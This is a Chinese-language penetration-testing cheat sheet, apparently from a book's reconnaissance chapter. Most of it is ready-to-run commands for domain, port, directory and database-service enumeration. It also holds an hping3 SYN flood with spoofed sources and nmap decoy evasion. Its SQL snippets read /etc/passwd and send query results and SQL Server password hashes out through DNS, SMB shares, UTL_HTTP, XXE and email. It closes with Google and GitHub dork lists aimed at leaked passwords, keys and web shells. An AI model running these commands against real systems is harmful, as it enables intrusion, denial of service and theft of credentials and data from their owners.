# 侦查

## 2.1.1

### 1.Whois

whois 域名

https://www.whois.com/whois/

https://centralops.net/co/DomainDossier.aspx

### 2.DNS

dia a 域名

dnsrecon -d 域名 -t axfr

dnsenum 域名

dnsdumpster.com

### 3.CDN

17ce.com

sitereport.netcraft.com

### 4.子域名

searchdns.netcraft.com

crt.sh

#### Aort

```bash
python3 -m venv aort
source aort/bin/activate
pip3 install aort
```

aort -d 域名 --output subdomains.txt

#### Dome

```bash
git clone https://github.com/v4d1/Dome
cd Dome
python3 -m venv Dome
source Dome/bin/activate
pip install -r requirements.txt
```

python3 dome.py -m passive -d 域名

python3 dome.py -d 域名 -m active -w wordlists/wordlist.txt

#### Anubis

```bash
mkdir anubis
cd anubis
python3 -m venv anubis
source anubis/bin/activate
pip3 install anubis-netsec
```

anubis -tip 域名 -o 文本文件

anubis -t 域名 --with-nmap -o 文本文件 -i --overwrite-nmap-scan "-F -T5"

#### Subfinder

```bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

./subfinder -d 域名

### 5.主机枚举

```bash
hping3 --scan 端口 -S 域名/IP地址
hping3 -S --flood --rand-source -p 端口 IP地址/域名
nmap -A -T4 IP地址/域名
nmap -T4 -p 1-65535 IP地址/域名  //全端口扫描
nmap -T4 IP地址/域名 --spoof-mac 0  //伪造MAC地址
nmap -T4 -f IP地址/域名  //请求包分段
nmap -D IP地址1,IP地址2,...... IP/域名  //伪造IP地址并插入攻击者IP地址
nmap -D RND 随机IP地址数量 IP/域名  //随机IP地址伪造
nmap --spoof-mac 0 --data-length 24 -T4 -f --mtu 16 -D RND -sS -sV -p 1-65535 -n -oA 文本文件 IP/域名
//高隐蔽性扫描

nmap IP地址段 --open -oG scan; cat scan | grep "/open" | cut -d " " -f 2 > active
cat active
//查看地址段存活IP地址

for x in 80 8080 443; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x IP地址段; done
//枚举地址段端口状态
```

## 2.1.2

### 1.目录文件

#### GoBuster

```bash
go install github.com/OJ/gobuster/v3@latest
```

./gobuster dir -u IP地址或域名 -w 字典文件

./gobuster dir -u IP地址或域名 -c 'cookie值' -t 50 -w 字典文件

#### Dirb

dirb IP地址或域名

dirb IP地址或域名 -c "cookie值"

dirb IP地址或域名 -p 代理IP地址:代理端口号

dirb IP地址或域名 -a "User-Agent值" 字典文件

#### Wfuzz

```bash
wfuzz -w 字典文件路径 --hc 404 IP地址或域名/FUZZ
wfuzz -w 字典文件 -w 字典文件 -w 字典文件 --hc 404 IP地址或域名/FUZZ/FUZ2ZFUZ3Z
wfuzz -w 字典文件 --hc 404 IP地址或域名/FUZZ.php
//枚举php文件
wfuzz -z file,字典文件 -d "用户名参数=FUZZ&密码参数=FUZZ" --hc 302 IP地址或域名
//枚举用户名密码
wfuzz -w 字典文件 -b cookie=“cookie值” IP地址或域名/FUZZ
//枚举登陆后网站
wfuzz -f,/字典文件 -p 代理IP地址:代理端口 --hc 404 IP地址或域名/FUZZ
//使用代理枚举
```

#### ffuf

```
ffuf -u IP地址或域名/FUZZ -c -w 字典文件
ffuf -mc all -fc 404 -ac -sf -s -w 字典文件 -c -u IP地址或域名/FUZZ
ffuf -u IP地址或域名/FUZZ -w 字典文件 -recursion -c //递归扫描
ffuf -u IP地址或域名/FUZZ -w 字典文件 -recursion -e .文件后缀 -c
//枚举后缀文件
```

#### 字典文件

https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

### 2.指纹识别

#### 插件

Wappalyzer

What runs

#### WhatWEB

```bash
whatweb IP地址或域名
whatweb IP地址或域名 -v
whatweb IP地址或域名 -H:HTTP头:HTTP头 -U:User-Agent
```

### 3.Waf识别

```bash
wafw00f IP地址或域名
```

### 4.网页提取

#### Gospider

```bash
go install github.com/jaeles-project/gospider@latest
./gospider -s "http://域名或IP地址/" --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt
cat urls.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

#### Curl

```bash
curl 域名或IP地址/JavaScript文件地址 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

#### LinkFinder

```bash
python3 linkfinder.py -d -i 域名或IP地址
```

### 5.运行服务

#### SAMB/SMB

```bash
nbtscan IP地址和nmblookup-A IP地址
nbtstat -A IP地址
enum4linux IP地址
smbmap -H IP地址

smbclient -L IP地址
smbclient //IP地址/共享的驱动器或文件夹
//连接目标主机的SMB服务

nmap --script smb-enum-shares -p139,445 IP地址
//使用Nmap列出共享驱动器

crackmapexec smb IP地址 -u 'SMB用户名' -p 'SMB密码' –shares
//枚举SMB共享

use auxiliary/scanner/smb/smb_lookupsid
//查看目标主机的本地用户
```

#### SNMP

```bash
nmap -sU -p161 -script=snmp-brute IP地址
snmpwalk -v 1 -c IP地址
snmpset -v 1 -c public IP地址 iso.3.6.1.2.1.1.5.0 s 更改字符串内容
snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.1.5.0
snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.25.2.2  //查看系统内存大小
snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.4.20  //查看系统内IP地址
snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.1  //查看系统信息
nmap -sU -p161 -script=snmp-sysdescr IP地址
snmp-check IP地址 -p 161 -c public
```

#### NFS/RPC

```bash
showmount -e IP地址
rpcinfo -p IP地址
nmap -sV -script=nfs-showmount IP地址
```

#### MySql

```bash
nmap --script=mysql-info -p3306 IP地址
```

```sql
SELECT host, user FROM mysql.user WHERE Super_priv = 'Y';
//获取目标主机DBA用户
SELECT @@datadir;
//获取MySql数据路径
SELECT LOAD_FILE('/etc/passwd')；
SELECT LOAD_FILE(0x2f6574632f706173737764);
//读取/etc/passwd
```

数据转储

```sql
SELECT LOAD_FILE(concat('\\\\',(SQL语句), '.DNSLog主机\\'));
//DNS转储
SELECT * FROM USERS INTO OUTFILE '\\IP地址\SMB驱动器和文件共享\output.txt';
//SMB转储
SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt';
//转储文件到网页目录
```

#### Oracle

```sql
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
//获取DBA用户

SELECT * FROM session_privs;
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
//检测当前权限

SELECT name FROM V$DATAFILE;
//获取当前数据库文件位置

SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual;
SELECT UTL_INADDR.get_host_name('IP地址') FROM dual;
//获取主机名和IP地址
```

读取文件

```sql
SQL>
declare
  f utl_file.file_type;
  s varchar(200);
begin
  f := utl_file.fopen('/root', '文本文件', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;
/
set serveroutput ON  //允许屏幕输出
/  //再次运行命令即可查看指定文本文件的200个字符
```

数据转储

```sql
SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test"> %remote; %param1;]>') FROM dual;
//XML外部实体

SELECT UTL_HTTP.request ('http://IP地址/') FROM dual;
//UTL_HTTP

SELECT UTL_URL.escape('http://IP/' || USER) FROM dual;
//特殊字符转义
```

#### SQL Server

```bash
auxiliary/scanner/mssql/mssql_ping
auxiliary/admin/mssql/mssql_sql
admin/mssql/mssql_enum
```

https://github.com/NetSPI/PowerUpSQL/tree/master/templates/tsql

```powershell
powershell -ep bypass
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceLocal -Verbose  //获取SQL Server状态
Get-SQLServerInfoThreaded -Threads 10 -Verbose  //获取主机基本信息
Get-SQLDomainComputer  //查看当前域主机
```

读取文件

```sql
1.txt
sp_configure 'show advanced options',1
reconfigure
go
//启用高级显示
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//启用临时查询
EXEC sp_MSset_oledb_prop
//显示可用的程序
SELECT * FROM OpenDataSource( 'Microsoft.ACE.OLEDB.12.0','Data Source="c:\temp";Extended properties="Text;hdr=no"')...file#txt
//读取一个文本文件

2.本地文件
CREATE TABLE #file (content nvarchar(4000));
//创建临时表
BULK INSERT #file FROM 'c:\temp\file.txt';
//将文件插入临时表
SELECT content FROM #file

3.UNC路径
CREATE TABLE #file (content nvarchar(4000));
BULK INSERT #file FROM '\\127.0.0.1\c$\temp\file.txt';
//将文件插入临时表
SELECT content FROM #file
DROP TABLE #file
//删除临时表

4.WebDav路径
CREATE TABLE #file (content nvarchar(4000));
BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';
SELECT content FROM #file
DROP TABLE #file

5.xlsx
sp_configure 'show advanced options',1
reconfigure
go
//启用高级显示
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//启用临时查询
EXEC sp_MSset_oledb_prop
//显示可用程序
SELECT * FROM OPENDATASOURCE('Microsoft.ACE.OLEDB.12.0','Data Source=C:\windows\temp\Book1.xlsx;Extended Properties=Excel 8.0')...[Targets$]
//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)

6.OpenRowSet
sp_configure 'show advanced options',1
reconfigure
go
//启用高级显示
sp_configure 'ad hoc distributed queries',1
reconfigure
go
启用临时查询
SELECT cast(BulkColumn as varchar(max)) as Document FROM OPENROWSET(BULK N'C:\windows\temp\blah.txt', SINGLE_BLOB) AS Document
//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)

7.OpenRowSet txt
EXEC sp_MSset_oledb_prop
//显示可用程序
sp_configure 'show advanced options',1
reconfigure
go
//启用高级显示
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//启用临时查询
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=c:\temp\;HDR=Yes;FORMAT=text', 'SELECT * FROM [file.txt]')
//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)

8.OpenRowSet xlsx
EXEC sp_MSset_oledb_prop
//显示可用程序
sp_configure 'show advanced options',1
reconfigure
go
//启用高级显示
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//启用临时查询
SELECT column1 FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0;Database=C:\windows\temp\Book1.xlsx;', 'SELECT * FROM [Targets$]')
//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)
```

数据转储

```sql
DECLARE @host varchar(800);
select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.domain.com' from sys.sql_logins;
exec('xp_fileexist "\' + @host + 'c$boot.ini"');
//DNS查询

xp_dirtree '\\data.domain.com\file'
//UNC路径

sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='snowwolf@email.com',@query='select @@version';
//sp_send_dbmail查询

EXEC master..xp_sendmail 'snowwolf@email.com', 'test.'
//xp_sendmail查询

EXEC xp_sendmail @recipients='harold@netspi.com',
@message='test.',
@copy_recipients='snowwolf@email.com',
@subject='TEST'
//xp_sendmail发送完整邮件

EXEC xp_sendmail 'snowwolf@email.com', @query='SELECT @@version';
//xp_sendmail

CREATE TABLE ##texttab (c1 text)
INSERT ##texttab values ('test.')
DECLARE @cmd varchar(56)
SET @cmd = 'SELECT c1 from ##texttab'
EXEC master.dbo.xp_sendmail 'robertk',
@query = @cmd, @no_header='TRUE'
DROP TABLE ##texttab
//将查询结果作为附件
```

## 2.1.3

### Amass

```bash
amass enum -passive -d 域名 -src
amass enum -active -d 域名
amass enum -v -src -ip -brute -min-for-recursive 2 -d 域名
amass viz -d3 -d 域名
```

### IVRE

```bash
apt install ivre ivre-doc
ivre ipinfo –init  //初始化IP地址信息
ivre scancli –init  //初始化主动扫描数据库
ivre view –init  //初始化视图信息
ivre flowcli –init  //初始化数据流信息
sudo ivre runscansagentdb –init  //初始化远程代理扫描
ivre ipdata –download  //下载IP地址数据
ivre runscans --routable --limit 100 --output=XMLFork --processes 10
//运行10个并发Nmap进程来枚举随机100个IP地址
ivre scan2db -c ROUTABLE-001 -s MySource -r scans/ROUTABLE/up
//分析Nmap的扫描结果并将其添加到数据库中
ivre db2view nmap
//从Nmap扫描结果和被动侦查的数据库中创建视图
ivre scancli –count
//统计数据
ivre httpd --bind-address 0.0.0.0
启动WEB图形化显示

rm -rf scans/ROUTABLE/*
//清除测试数据
ivre scancli --init && ivre view –init //数据初始化
ivre runscans --routable --categories 自定义分类名 --network 网段 --output=XMLFork --processes 10  //自定义网段扫描
ivre scan2db -c 自定义分类名 -s 扫描源 -r scans/自定义分类名/up
ivre db2view nmap
ivre httpd --bind-address 0.0.0.0
```

### 在线网站

https://osintframework.com/

https://github.com/cipher387/osint_stuff_tool_collection

Shodan、Censys、BinaryEdge

## 2.2.1

https://www.social-searcher.com/

https://github.com/lorien/awesome-osint-1#social-media-tools

## 2.2.2

https://freepeoplesearchtool.com/

"Microsoft" site:linkedin.com/in

## 2.3.1

https://opencorporates.com/

https://www.corporationwiki.com/

## 2.3.2

### Google

```dork
site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net "company"
//代码共享
site:github.com | site:gitlab.com | site:bitbucket.org "company"
site:stackoverflow.com "target.com"
site:http://trello.com | site:*.atlassian.net "company"
//项目管理站点
site:http://justpaste.it | site:http://pastebin.com "company"
site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini
//配置文件
site:target.com ext:sql | ext:dbf | ext:mdb
//数据库文件
site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup
//备份文件
inurl:"/.git" target.com -github
//git文件
site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv
//公开文件
site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo "published by the PHP Group" | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:"/phpinfo.php" | inurl:".htaccess" | ext:swf
//其它文件
site:target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
//SQL 错误
site:target.com "PHP Parse error" | "PHP Warning" | "PHP Error"
//PHP错误
site:target.com inurl:signup | inurl:register | intitle:Signup
//登录页面
site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http
//重定向
site:target.com ext:action | ext:struts | ext:do
//Apache Struts RCE
site:pastebin.com target.com
site:linkedin.com employees target.com
//领英员工搜索
site:target.com inurl:wp-content | inurl:wp-includes
//WordPress文件
site:*.target.com
//子域名
site:*.*.target.com
//子域名
site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com "target"
//S3桶
intitle:traefik inurl:8080/dashboard "target"
intitle:"Dashboard [Jenkins]"
```

https://www.exploit-db.com/google-hacking-database

### Github

```bash
".mlab.com password"
"access_key"
"access_token"
"amazonaws"
"api.googlemaps AIza"
"api_key"
"api_secret"
"apidocs"
"apikey"
"apiSecret"
"app_key"
"app_secret"
"appkey"
"appkeysecret"
"application_key"
"appsecret"
"appspot"
"auth"
"auth_token"
"authorizationToken"
"aws_access"
"aws_access_key_id"
"aws_key"
"aws_secret"
"aws_token"
"AWSSecretKey"
"bashrc password"
"bucket_password"
"client_secret"
"cloudfront"
"codecov_token"
"config"
"conn.login"
"connectionstring"
"consumer_key"
"credentials"
"database_password"
"db_password"
"db_username"
"dbpasswd"
"dbpassword"
"dbuser"
"dot-files"
"dotfiles"
"encryption_key"
"fabricApiSecret"
"fb_secret"
"firebase"
"ftp"
"gh_token"
"github_key"
"github_token"
"gitlab"
"gmail_password"
"gmail_username"
"herokuapp"
"internal"
"irc_pass"
"JEKYLL_GITHUB_TOKEN"
"key"
"keyPassword"
"ldap_password"
"ldap_username"
"login"
"mailchimp"
"mailgun"
"master_key"
"mydotfiles"
"mysql"
"node_env"
"npmrc _auth"
"oauth_token"
"pass"
"passwd"
"password"
"passwords"
"pem private"
"preprod"
"private_key"
"prod"
"pwd"
"pwds"
"rds.amazonaws.com password"
"redis_password"
"root_password"
"secret"
"secret.password"
"secret_access_key"
"secret_key"
"secret_token"
"secrets"
"secure"
"security_credentials"
"send.keys"
"send_keys"
"sendkeys"
"SF_USERNAME salesforce"
"sf_username"
"site.com" FIREBASE_API_JSON=
"site.com" vim_settings.xml
"slack_api"
"slack_token"
"sql_password"
"ssh"
"ssh2_auth_password"
"sshpass"
"staging"
"stg"
"storePassword"
"stripe"
"swagger"
"testuser"
"token"
"x-api-key"
"xoxb "
"xoxp"
Jenkins
OTP
oauth
authoriztion
password
pwd
ftp
dotfiles
JDBC
key-keys
send_key-keys
send,key-keys
token
user
login-singin
passkey-passkeys
pass
secret
SecretAccessKey
app_AWS_SECRET_ACCESS_KEY AWS_SECRET_ACCESS_KEY
credentials
config
security_credentials
connectionstring
ssh2_auth_password
DB_PASSWORD
[WFClient] Password= extension:ica
access_key
bucket_password
dbpassword
dbuser
extension:avastlic "support.avast.com"
extension:bat
extension:cfg
extension:env
extension:exs
extension:ini
extension:json api.forecast.io
extension:json googleusercontent client_secret
extension:json mongolab.com
extension:pem
extension:pem private
extension:ppk
extension:ppk private
extension:properties
extension:sh
extension:sls
extension:sql
extension:sql mysql dump
extension:sql mysql dump password
extension:yaml mongolab.com
extension:zsh
filename:.bash_history
filename:.bash_history DOMAIN-NAME
filename:.bash_profile aws
filename:.bashrc mailchimp
filename:.bashrc password
filename:.cshrc
filename:.dockercfg auth
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.esmtprc password
filename:.ftpconfig
filename:.git-credentials
filename:.history
filename:.htpasswd
filename:.netrc password
filename:.npmrc _auth
filename:.pgpass
filename:.remote-sync.json
filename:.s3cfg
filename:.sh_history
filename:.tugboat NOT _tugboat
filename:_netrc password
filename:apikey
filename:bash
filename:bash_history
filename:bash_profile
filename:bashrc
filename:beanstalkd.yml
filename:CCCam.cfg
filename:composer.json
filename:config
filename:config irc_pass
filename:config.json auths
filename:config.php dbpasswd
filename:configuration.php JConfig password
filename:connections
filename:connections.xml
filename:constants
filename:credentials
filename:credentials aws_access_key_id
filename:cshrc
filename:database
filename:dbeaver-data-sources.xml
filename:deployment-config.json
filename:dhcpd.conf
filename:dockercfg
filename:environment
filename:express.conf
filename:express.conf path:.openshift
filename:filezilla.xml
filename:filezilla.xml Pass
filename:git-credentials
filename:gitconfig
filename:global
filename:history
filename:htpasswd
filename:hub oauth_token
filename:id_dsa
filename:id_rsa
filename:id_rsa or filename:id_dsa
filename:idea14.key
filename:known_hosts
filename:logins.json
filename:makefile
filename:master.key path:config
filename:netrc
filename:npmrc
filename:pass
filename:passwd path:etc
filename:pgpass
filename:prod.exs
filename:prod.exs NOT prod.secret.exs
filename:prod.secret.exs
filename:proftpdpasswd
filename:recentservers.xml
filename:recentservers.xml Pass
filename:robomongo.json
filename:s3cfg
filename:secrets.yml password
filename:server.cfg
filename:server.cfg rcon password
filename:settings
filename:settings.py SECRET_KEY
filename:sftp-config.json
filename:sftp-config.json password
filename:sftp.json path:.vscode
filename:shadow
filename:shadow path:etc
filename:spec
filename:sshd_config
filename:token
filename:tugboat
filename:ventrilo_srv.ini
filename:WebServers.xml
filename:wp-config
filename:wp-config.php
filename:zhrc
HEROKU_API_KEY language:json
HEROKU_API_KEY language:shell
HOMEBREW_GITHUB_API_TOKEN language:shell
jsforce extension:js conn.login
language:yaml -filename:travis
msg nickserv identify filename:config
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "bucket_name"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_BUCKET"
org:Target "S3_ENDPOINT"
org:Target "S3_SECRET_ACCESS_KEY"
password
path:sites databases password
private -language:java
PT_TOKEN language:bash
redis_password
root_password
secret_access_key
SECRET_KEY_BASE=
shodan_api_key language:python
WORDPRESS_DB_PASSWORD=
xoxp OR xoxb OR xoxa
s3.yml
.exs
beanstalkd.yml
deploy.rake
.sls

language:bash password
language:bash pwd
language:bash ftp
language:bash dotfiles
language:bash JDBC
language:bash key-keys
language:bash send_key-keys
language:bash send,key-keys
language:bash token
language:bash user
language:bash login-singin
language:bash passkey-passkeys
language:bash pass
language:bash secret
language:bash credentials
language:bash config
language:bash security_credentials
language:bash connectionstring
language:bash ssh2_auth_password

language:python password
language:python pwd
language:python ftp
language:python dotfiles
language:python JDBC
language:python key-keys
language:python send_key-keys
language:python send,key-keys
language:python token
language:python user
language:python login-singin
language:python passkey-passkeys
language:python pass
language:python secret
language:python credentials
language:python config
language:python security_credentials
language:python connectionstring
language:python ssh2_auth_password

org:facebookresearch https://
org:facebookresearch http://
org:facebookresearch ldap
org:facebookresearch ftp
org:facebookresearch sftp
org:facebookresearch host:
org:facebookresearch login
```

### LeakLooker

```bash
git clone https://github.com/woj-ciech/LeakLooker-X
cd LeakLooker-X
python3 -m venv LeakLooker
source LeakLooker/bin/activate
apt-get install python3-jsbeautifier celery
pip install -r requirements.txt
pip install jsbeautifier
python3 manage.py makemigrations
python3 manage.py migrate
修改主目录下的config.json文件中的Binary Edge API
python3 manage.py runserver
另起终端
apt-get install redis redis-server
redis-server
再次另起终端并切换到工具主目录
celery -A leaklooker worker --loglevel=info

命令：
Rsync:
rsync -az IP:/module ~/ — progress
rsync — list-only IP:/
rsync -avrz /opt/data/filename root@ip:/opt/data/file

CouchDb:
/_all_dbs
<db>/_all_docs?include_docs=true&limit=50
/<db>/doc?rev=<nr>
<db>/doc
<db>/doc/<name>
/<db>/<docid>
/<db>/<id>/<attachment_id>

MongoDB:
show databases
use ‘db’
show collections
db.’collection’.stats()
db.’collection’.findOne()
db.’collection’.find().prettyPrint()
db.’collection’.find()

Elastic:
_cat/nodes?v
_cat/count?v
<indices>/_search?size=50
```

### 邮箱

Hunter.io

filetype:xls inurl:"email.xls" site:"域名"
